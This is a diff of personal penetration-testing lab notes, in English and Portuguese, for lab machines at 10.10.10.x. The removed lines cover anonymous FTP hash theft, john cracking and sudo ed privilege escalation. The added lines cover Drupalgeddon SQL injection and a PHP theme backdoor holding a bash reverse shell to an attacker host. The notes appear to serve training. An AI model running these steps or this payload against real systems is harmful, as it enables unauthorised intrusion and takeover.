@@ -33,45 +33,39 @@ PORT    STATE SERVICE VERSION
 Enumerate services such as FTP, HTTP, SSH, etc.
 Look for valuable files and potential weaknesses.
 
-ftp 10.10.10.8 anonymous okay
-ssh <>@10.10.10.8 need passward and user
 
 4. Vulnerability Identification
 Identify potential vulnerabilities based on the reconnaissance and enumeration.
 Search for public exploits, misconfigurations, or weak service versions.
 
-server has fpt anonymous user and has file with hashes of passwd
-ftp 10.10.10.8 anonymous 
-password no needed
-ls backup 
-get backup
+nmap -sV -sC -v 10.10.10.9
 
-***************
-cat backup 
-we can see users and hashes, now we can use john/hashcat to find password, but for dont take so longe I just pickup one, sunset
+achamos o Drupal 7.0 < 7.31.
+searchsploit Drupal / https://www.exploit-db.com/exploits/34984
 
-echo "conteúdo do arquivo/sunset-hashs" > novo_nome.txt
-vin sunset/hashe
+Achamos essa vulnerabilidade: Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1), ela vai inserir um usuario e senha dentro do banco 
+de dados.
 
-john <named file with hashes>
-john --show <named file with hashes> case you alredy has brokend
-now we have user an password of ssh
- 
+O exploite esta em uma versão diferente do python, se der erro use IA ou voce mesmo pode fazer as auterações, preste atenção, vão ser dois scripts,
+um dentro do exploit-db e outro no git, eles devem ser salvos em formatos .py. 
+
+vi exploit.py (ser der erro verifique a versão do python)
+drupalpass.py (ser der erro verifique a versão do python)
+
+# python exploit.py http://10.10.10.9/node?destination=node seuusuario suasenha
+Success!
+Login now with user:seu-usuario and pass:sua-senha
+
 
 5. Exploitation
 Exploit vulnerabilities to gain access to the system.
 Use tools like Metasploit, Hydra, or custom scripts.
 
-ssh sunset@10.10.10.6
-sudo -l
+Entranos no drupal com senha e usuario, ainda não temos acesso root.
+No Drupal vimos a possibilidade de fazer instalação de um theme uppando ele atraves da maquina atacante.
+vai direto no site do drupal baxe o theme que esta no formato php, insira dendtro do template.php o scrip malicioso/backdoor;
 
-User sunset may run the following commands on sunset:
-    (root) NOPASSWD: /usr/bin/ed
-sunset@sunset:~$ sudo /usr/bin/ed  /etc/passwd
-
-Em outro termi
- openssl passwd -1 -salt zak batata
-$1$zak$VbEQapB4mpickfJIMyL1v0
+exec("/bin/bash -c 'bash -i >& /dev/tcp/ip-maq-ataque/443 0>&1'");
 
 
 
